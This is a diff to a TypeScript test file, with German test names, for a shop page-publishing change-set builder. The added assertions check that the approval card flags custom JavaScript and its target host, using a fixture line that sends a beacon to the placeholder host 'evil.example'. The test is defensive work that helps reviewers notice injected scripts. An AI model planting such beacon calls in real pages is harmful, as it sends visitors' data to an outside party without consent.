@@ -271,6 +271,9 @@ test('buildPublishChangeSet: Landingpage-URL wird normalisiert, ungültige URL/D
   await assert.rejects(buildPublishChangeSet(f.sw, { ...SPEC, type: 'product_detail' } as PageSpec, { target: 'product', productIds: ['p1', 'p2'] }), /Produkt nicht gefunden: p2/);
   const cat = await buildPublishChangeSet(f.sw, SPEC, { target: 'category', categoryId: 'cat', metaTitle: 'Titel' });
   assert.equal(cat.items[1].label, 'Kategorie „Vasen“'); assert.equal(cat.items[2].after, 'Titel');
+  assert.equal(cat.script, undefined, 'ohne JS keine Warnung');
+  const js = await buildPublishChangeSet(f.sw, { ...SPEC, sections: [{ blocks: [{ type: 'custom-html', html: '<p>x</p>', js: "navigator.sendBeacon('https://evil.example/c')" }, { type: 'product-listing' }] }] } as unknown as PageSpec, { target: 'category', categoryId: 'cat' });
+  assert.deepEqual(js.script, { kinds: ['js'], hosts: ['evil.example'] }, 'Freigabe-Karte zeigt JavaScript und Zieladresse');
 });
 
 test('Neue Produkte: Änderungsset mit Payload, Standard inaktiv, Preis Pflicht', async () => {
